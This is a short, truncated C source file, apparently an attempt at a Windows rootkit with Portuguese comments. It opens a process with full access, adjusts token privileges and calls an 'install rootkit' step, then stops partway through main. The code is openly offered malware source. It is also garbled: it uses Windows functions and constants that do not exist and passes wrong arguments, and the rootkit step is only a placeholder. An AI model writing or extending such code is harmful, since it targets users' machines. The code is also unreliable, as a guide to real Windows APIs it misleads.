#define _WIN32_IE 0x0500
#define WIN32_LEAN_AND_MEAN 0x200
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#define get_process_handle GetProcessHandle
#define set_thread_flag SetThreadFlag
typedef struct tagTHREAD_BASIC_INFORMATION {
 DWORD dwSize;
 PVOID pThread;
} THREAD_BASIC_INFORMATION;
struct tagPROCESS_INFORMATION {
 DWORD dwProcessId;
 THREAD_BASIC_INFORMATION th;
};
DWORD WINAPI RootkitMain(LPVOID lpParam) {
 HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, NULL);
 PROCESS_INFORMATION pi;
 ZeroMemory(&pi, sizeof(pi));
 // Inicializa acesso ao processo
 if (!OpenProcessToken(hProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &pi.dwProcessId)) {
 CloseHandle(hProc);
 return 0;
 }
 // Adquire privilégios do processo
 if (!AdjustTokenPrivileges(NULL, SELF_ADJUST_PRIVILEGES, &pi.th, 0, NULL, NULL)) {
 CloseHandle(hProc);
 return 0;
 }
 // Instale rootkit
 set_thread_flag(GetCurrentThread(), TRUE);
 return 0;
}
int main() {
 STARTUPINFOW si;
 ZeroMemory(&si, sizeof(si));
 si.cb = sizeof(si);
 CreateStartupInfoW(&si);
 si.lpReserved = NULL;
 si.lpDesktop = NULL;
 si.lpTitle = L"Rootkit";
 si.dwFlags = STARTF_USESHOWWINDO
